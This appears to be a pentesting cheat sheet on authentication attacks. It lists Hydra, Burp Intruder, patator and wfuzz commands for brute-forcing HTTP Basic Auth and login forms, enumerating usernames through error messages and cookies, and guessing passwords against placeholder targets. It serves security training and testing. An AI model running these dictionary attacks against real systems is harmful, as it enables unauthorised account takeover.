# Authentication Attacks

## Authentication Attacks



### HTTP Basic Authentication

HTTP Basic Authentication with Hydra:

```text
hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.10:8080/manager/html
```

### Login Forms

### Enumerating Usernames via Error Messages

We can enumerate usernames with error messages.

`Invalid User`

#### BurpSuite Intruder

Add a position in the value that you want to intrude/fuzz:

```text
Intruder -> Positions -> Sniper -> Add Position
```

Select a dictionary attack with:

```text
Intruder -> Payloads -> Payload set -> Payload type (Simple List | Dictionary Attack)
```

Load the dictionary with:

```text
Intruder -> Payloads -> Payload Options -> Load
```

Match the string 'Invalid User' from the HTTP response:

```text
Intruder -> Options -> Grep - Match -> Clear -> Add -> Invalid User
```

Follow redirections on the target only:

```text
Intruder -> Options -> Redirections -> Follow redirections -> In-scope only
```

Start the attack with:

```text
Intruder -> Payloads -> Start attack OR Intruder Start Menu -> Start attack
```

#### patator

We can view the help panel with:

```text
patator http_fuzz --help
```

A few examples of an HTTP authentication dictionary attack: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt -x ignore:fgrep='Invalid User'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 -x ignore:fgrep='Invalid User'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid User'
```

**wfuzz**

A few examples of an HTTP authentication dictionary attack: \(Change the parameters and their values\)

```text
wfuzz -c -w names.txt -d "username=FUZZ&password=password" http://10.10.10.10/login.php
```

### Enumerating Usernames via Cookie Values

We can enumerate usernames with cookie values.

#### BurpSuite Intruder

Add a position in the value that you want to intrude/fuzz:

```text
Intruder -> Positions -> Sniper -> Add Position
```

Select a dictionary attack with:

```text
Intruder -> Payloads -> Payload set -> Payload type (Simple List | Dictionary Attack) Intruder -> Payloads -> Payload Options -> Load
```

Match the response string of an invalid user cookie parameter:

```text
Intruder -> Options -> Grep - Match -> Clear -> Add -> wrong_user
```

Follow redirections on the target only

```text
Intruder -> Options -> Redirections -> Follow redirections -> In-scope only
```

Start the attack with:

```text
Intruder -> Payloads -> Start attack OR Intruder Start Menu -> Start attack
```

#### patator

We can do a username enumeration with: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt --x ignore:fgrep='wrong_user'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 -x ignore:fgrep='wrong_user'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='wrong_user'
```

### Password Enumeration

#### patator

We can do a password enumeration with: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=admin&password=FILE0&Submit=Login' 0=passwords.txt --x ignore:fgrep='Invalid Password'
```



